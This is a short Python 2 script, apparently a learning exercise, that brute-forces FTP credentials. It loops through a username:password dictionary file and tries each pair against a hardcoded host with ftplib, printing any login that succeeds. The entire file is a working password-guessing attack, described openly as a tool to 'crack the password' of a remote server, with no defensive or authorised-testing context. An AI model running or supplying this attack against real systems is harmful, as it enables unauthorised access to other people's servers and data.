#!/usr/bin/env python
'''
this code is used to access the ftp service
of remote system through brute force.
We have a file of dictionary in which passwords
are present. this script will access the passwords one
by one and try those on remote ftp server.And try to
crack the password.
'''
import ftplib                           #help us to connect to frp server remotely through python

def bruteLogin(hostname, passwdFile):                           #this functio open the the file of passwords and username and try it on remote ftp server one by one
        pF = open(passwdFile, 'r')
        for line in pF.readlines():
            	userName = line.split(':')[0]
            	passWord = line.split(':')[1].strip('\r').strip('\n')
             	print "[+] Trying: "+userName+"/"+passWord
             	try:
			ftp = ftplib.FTP(hostname)              #it will make an object 'ftp' in arguments you give ip of host
                    	ftp.login(userName, passWord)           # here you put username and passwords
                    	print '\n[*] ' + str(hostname) +   ' FTP Login Succeeded: '+userName+'/'+passWord
                    	ftp.quit()                              #here you quit the ftp session on remote computer
                    	return (userName, passWord)
            	except Exception,e :
			pass
	print '\n[-] Could not brute force FTP credentials.'
        return (None, None)

host = '192.168.1.2'                                            #user ip of host
passwdFile = '/home/shikhar/Desktop/pass_user.txt'              #destination path of dictionary
bruteLogin(host, passwdFile)                                    #fuction call of bruteforce login`
